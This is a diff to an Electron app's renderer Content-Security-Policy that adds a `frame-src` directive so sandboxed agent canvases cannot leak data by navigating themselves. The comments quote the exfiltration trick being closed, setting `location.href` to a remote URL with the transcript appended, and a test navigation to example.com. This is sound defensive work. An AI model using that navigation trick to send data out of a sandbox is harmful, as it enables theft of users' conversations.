@@ -55,11 +55,16 @@
  *   • `base-uri 'none'` — an injected `<base>` cannot re-point every relative URL in the app
  *   • `form-action 'none'` — no form may navigate anywhere (the app has no navigating forms)
  *   • `frame-ancestors 'none'` — the renderer document may never be embedded
+ *   • `frame-src` — an agent canvas may not navigate itself to a remote origin (NC-SEC-031)
  * That matters here because the renderer holds `window.api`, the IPC bridge to the main process.
  *
- * It is NOT an exfiltration control, and claiming otherwise would be ruling 2's "a fault is never
- * described falsely" in reverse. `connect-src` (via `default-src`) permits arbitrary http/https/
- * ws/wss because the UI is a thin client that reaches an instance **by URL**: the built-in
+ * It is NOT an exfiltration control FOR THE APP ITSELF, and claiming otherwise would be ruling 2's
+ * "a fault is never described falsely" in reverse. It is one for the agent canvases it frames —
+ * `frame-src` below is the reason a canvas cannot carry the transcript out in a URL — but that is
+ * a bound on embedded content, not on the renderer.
+ *
+ * `connect-src` (via `default-src`) permits arbitrary http/https/ws/wss because the UI is a thin
+ * client that reaches an instance **by URL**: the built-in
  * sidecar on a random loopback port, a WSL distro's server, and — the shipped remote-access
  * feature (R1–R8) — any peer instance the user types in at runtime, plus its terminal WebSocket.
  * That list changes after the document has loaded, and a CSP cannot. Hardcoding localhost would
@@ -85,6 +90,33 @@ export const RENDERER_CSP_DIRECTIVES: Readonly<Record<string, readonly string[]>
   "script-src": ["'self'", "nc:", "'unsafe-inline'", "'wasm-unsafe-eval'"],
   "style-src": ["'self'", "nc:", "data:", "blob:", "'unsafe-inline'"],
   "worker-src": ["'self'", "nc:", "blob:"],
+  /**
+   * 🔴 NC-SEC-031 — the last way an agent canvas could still phone home.
+   *
+   * NC-SEC-003 put `default-src 'none'` inside every srcdoc, which closes fetch, XHR, WebSocket
+   * and beacon. It does not close NAVIGATION: a frame navigating ITSELF is checked against its
+   * PARENT's `frame-src`, not against its own policy, and the sandbox has no token for it either
+   * (`allow-top-navigation` governs navigating the TOP frame, not oneself). So
+   * `location.href = "https://…?" + transcript` still left the machine, with the data in the URL.
+   *
+   * Without this directive `frame-src` falls back to `default-src`, which carries `http:` and
+   * `https:` for the remote-instance feature — i.e. the fallback chain handed canvases the whole
+   * web. Stating it explicitly is the fix, and it belongs in the POLICY rather than in an Electron
+   * `will-frame-navigate` handler because a handler would bind to one surface.
+   *
+   * ⚠️ This desktop policy is one of TWO. The served web UI has its own in
+   * `novaclaw/src/server/shared/ui.ts`, which also declares no `frame-src` — but its `default-src`
+   * is `'self'`, so the same fallback lands somewhere safe there. The two policies are not shared
+   * and do not agree; see NC-SEC-032, which is that disagreement biting in the other direction.
+   *
+   * ⚠️ Measured before it was added, because getting this wrong kills every canvas silently and
+   * nothing in the tree would notice (2026-08-28, Chrome 148, parent policy carrying exactly this
+   * directive): the `about:srcdoc` frame still loaded and its inline script still ran, while
+   * `location.href = "https://example.com/…"` produced "Framing 'https://example.com/' violates
+   * the following Content-Security-Policy directive: frame-src 'self' data: blob:. The request has
+   * been blocked." No `about:` source is needed — srcdoc is not matched against this list.
+   */
+  "frame-src": ["'self'", "nc:", "data:", "blob:"],
   "object-src": ["'none'"],
   "base-uri": ["'none'"],
   "form-action": ["'none'"],
